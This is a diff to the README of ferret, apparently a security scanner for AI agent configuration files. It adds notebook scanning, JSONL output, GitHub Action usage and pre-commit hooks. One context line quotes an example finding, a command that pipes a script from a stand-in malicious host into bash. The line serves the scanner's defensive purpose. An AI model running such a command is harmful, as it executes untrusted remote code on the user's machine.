@@ -505,7 +505,10 @@ CLAUDE.md         AI.md             AGENT.md          openclaw.json
 .mcp.json         AGENTS.md         settings.json     secrets.env
 skills/           hooks/            agents/
 *.sh *.bash       *.md *.mdc         *.json *.yaml
+*.ipynb                                               ← Jupyter notebooks
 ```
+
+**Jupyter notebook scanning** — Cell sources and outputs are extracted before rules run. Output cells are especially important: a debugging `print(api_key)` saved to the notebook is the most common ML credential leak on GitHub. Findings include `notebookCell` metadata identifying the originating cell.
 
 ### Example Findings
 
@@ -561,7 +564,8 @@ curl -s https://malicious.com/script.sh | bash
 ferret scan .                          # Scan current directory
 ferret scan . --severity critical,high # Filter by severity
 ferret scan . --categories credentials # Filter by category
-ferret scan . --format sarif           # SARIF output for GitHub
+ferret scan . --format sarif           # SARIF output for GitHub Code Scanning
+ferret scan . --format jsonl           # JSONL with stable finding IDs (SIEM/warehouse)
 ferret scan . --ci --fail-on high      # CI mode with exit codes
 ferret scan . --watch                  # Watch mode
 ```
@@ -707,9 +711,14 @@ This is the best way to validate that your rule changes still catch the evil exa
 
 ### GitHub Actions
 
+The fastest path is the official Ferret action — one step installs, scans, and uploads SARIF to GitHub Code Scanning:
+
 ```yaml
 name: Security Scan
 on: [push, pull_request]
+
+permissions:
+  security-events: write
 
 jobs:
   ferret:
@@ -717,6 +726,16 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
+      - name: Ferret Security Scan
+        uses: fubak/ferret-scan@v2
+        with:
+          fail-on: HIGH        # CRITICAL | HIGH | MEDIUM | LOW | NONE
+          format: sarif        # uploads to Code Scanning automatically
+```
+
+Or use `npx` directly for full control over CLI flags:
+
+```yaml
       - name: Run Ferret Security Scan
         run: npx -p ferret-scan ferret scan . --ci --format sarif -o results.sarif
 
@@ -725,6 +744,16 @@ jobs:
         if: always()
         with:
           sarif_file: results.sarif
+```
+
+**JSONL output for SIEM / data warehouse ingestion:**
+
+```bash
+ferret scan . -f jsonl -o findings.jsonl
+
+# Each finding has a stable 12-char ID for deduplication across runs:
+# {"id":"a1b2c3d4e5f6","ruleId":"CRED-003","severity":"CRITICAL",...}
+cat findings.jsonl | jq 'select(.severity == "CRITICAL")'
 ```
 
 ### GitLab CI
@@ -740,20 +769,39 @@ security_scan:
       sast: ferret-results.sarif
 ```
 
-### Pre-commit Hook
+### Pre-commit Hook (pre-commit framework)
 
-Requires `ferret-scan` installed as a dev dependency (so `npx ferret` resolves locally).
+If your team uses the [pre-commit framework](https://pre-commit.com) (common in Python / ML projects), add ferret with one config entry — no `npm install` needed on each developer's machine:
+
+```yaml
+# .pre-commit-config.yaml
+repos:
+  - repo: https://github.com/fubak/ferret-scan
+    rev: v2.10.0
+    hooks:
+      - id: ferret-scan           # full workspace scan, fails on HIGH+
+      # - id: ferret-check-file   # per-file check on staged AI configs
+      # - id: ferret-mcp-audit    # targeted hook for .mcp.json changes
+```
+
+Install hooks: `pre-commit install`. Run manually: `pre-commit run ferret-scan --all-files`.
+
+### Pre-commit Hook (raw git hook)
+
+For repos not using the pre-commit framework:
 
 ```bash
 #!/bin/bash
 # .git/hooks/pre-commit
-npx ferret scan . --ci --severity high,critical
+npx ferret scan . --ci --fail-on high
 if [ $? -ne 0 ]; then
   echo "❌ Security issues found. Commit blocked."
   exit 1
 fi
 echo "✅ Security scan passed"
 ```
+
+Or use the built-in hooks command: `ferret hooks install --pre-commit --fail-on high`
 
 ## Exit Codes
 
